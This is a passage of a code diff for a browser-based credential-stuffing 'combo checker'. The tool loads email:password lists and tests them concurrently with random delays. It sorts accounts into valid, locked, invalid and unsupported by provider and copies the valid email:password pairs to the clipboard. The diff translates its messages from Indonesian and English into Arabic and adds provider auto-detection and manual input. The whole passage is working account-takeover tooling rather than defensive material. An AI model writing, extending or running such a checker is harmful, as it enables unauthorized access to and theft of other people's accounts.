+      log(`✓ صالح   ${acc.email}:${acc.pass}  [${country}] ${r.provider}`, 'l-valid');
     } else if (r.status === 'locked') {
       stats.locked++;
-      log(`🔒 LOCKED  ${r.email}:${r.pass}  [${country.code}]`, 'l-locked');
+      log(`🔒 مقفل   ${acc.email}:${acc.pass}  [${country}] ${r.provider} — ${r.note||''}`, 'l-locked');
+    } else if (r.status === 'unknown') {
+      stats.unknown++;
+      log(`? غير مدعوم  ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-unknown');
+    } else if (r.status === 'error') {
+      stats.invalid++;
+      log(`⚠ خطأ    ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-invalid');
     } else {
       stats.invalid++;
-      log(`✗ INVALID ${r.email}  [${country.code}]`, 'l-invalid');
+      log(`✗ خاطئ   ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-invalid');
     }
-
     stats.done++;
     updateCounters();
     await sleep(randDelay());
@@ -413,61 +572,51 @@ async function worker() {
 }
 
 async function startCheck() {
-  if (running || !queue.length) return;
-
+  if (running) return;
+  if (!queue.length) {
+    const manual = document.getElementById('manualInput').value;
+    if (manual.trim()) loadCombo(manual);
+  }
+  if (!queue.length) { log('لا توجد حسابات', 'l-invalid'); return; }
   running = true;
-  stats.done = 0;
-  stats.valid = 0;
-  stats.locked = 0;
-  stats.invalid = 0;
-  stats.total = queue.length;
-  stats.startTime = Date.now();
+  stats = { total:queue.length, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime: Date.now() };
   updateCounters();
-
   startBtn.disabled = true;
   document.getElementById('exportBtn').disabled = true;
   logEl.innerHTML = '';
-  log(`mulai cek ${queue.length} combo — concurrency ${CONFIG.concurrency}`, 'l-info');
-
+  log(`بدء فحص ${queue.length} حساب — كشف تلقائي للمزوّد`, 'l-info');
   const workers = [];
-  for (let i = 0; i < CONFIG.concurrency; i++) workers.push(worker());
+  for (let i=0; i<CONFIG.concurrency; i++) workers.push(worker());
   await Promise.all(workers);
-
   running = false;
   startBtn.disabled = false;
   document.getElementById('exportBtn').disabled = false;
-
-  const sec = Math.round((Date.now() - stats.startTime) / 1000);
-  log(`=== SELESAI — valid:${stats.valid} locked:${stats.locked} invalid:${stats.invalid} | ${sec}s ===`, 'l-info');
+  const sec = Math.round((Date.now()-stats.startTime)/1000);
+  log(`=== انتهى — صالح:${stats.valid} مقفل:${stats.locked} خاطئ:${stats.invalid} غير مدعوم:${stats.unknown} | ${sec}ث ===`, 'l-info');
 }
 
 function exportValid() {
   const out = [];
   logEl.querySelectorAll('.l-valid').forEach(el => {
-    const m = el.textContent.match(/VALID\s+(\S+@\S+):(\S+)/);
+    const m = el.textContent.match(/صالح\s+(\S+@\S+):(\S+)/);
     if (m) out.push(`${m[1]}:${m[2]}`);
   });
-  if (out.length) {
-    navigator.clipboard.writeText(out.join('\n'));
-    log(`copy ${out.length} akun valid ke clipboard`, 'l-info');
-  } else {
-    log('tidak ada akun valid', 'l-muted');
-  }
+  if (out.length) { navigator.clipboard.writeText(out.join('\n')); log(`تم نسخ ${out.length} صالح`, 'l-info'); }
+  else log('لا يوجد صالح', 'l-muted');
 }
 
 function resetAll() {
-  if (running) { log('tunggu selesai dulu', 'l-info'); return; }
-  queue = [];
-  currentFile = null;
-  fileInput.value = '';
-  fileInfo.classList.remove('show');
-  fileInfo.textContent = '';
+  if (running) { log('انتظر', 'l-info'); return; }
+  queue = []; currentFile = null; fileInput.value = '';
+  fileInfo.classList.remove('show'); fileInfo.textContent = '';
+  document.getElementById('manualInput').value = '';
   startBtn.disabled = true;
   document.getElementById('exportBtn').disabled = true;
   logEl.innerHTML = '';
-  stats = { total:0, valid:0, locked:0, invalid:0, done:0, startTime:0 };
+  stats = { total:0, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
+  DOMAIN_CACHE.clear();
   updateCounters();
-  log('reset — siap upload file baru', 'l-muted');
+  log('تمت إعادة التعيين', 'l-muted');
 }
 
 document.addEventListener('keydown', e => {
